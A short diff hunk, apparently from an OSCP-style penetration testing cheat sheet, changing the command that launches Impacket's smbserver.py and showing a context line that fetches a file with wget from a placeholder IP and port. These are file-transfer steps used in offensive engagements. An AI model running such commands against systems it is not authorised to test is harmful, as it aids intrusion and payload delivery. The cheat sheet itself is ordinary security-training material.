@@ -703,7 +703,7 @@ wget http://<IP>:<PORT>/<FILE>
 
 #### SMB Server
 ```
-python smbserver.py <SHARE NAME> <PATH>
+sudo python3 /opt/oscp/impacket/examples/smbserver.py <SHARE NAME> <PATH>
 ```
 
 #### Look for files in SMB
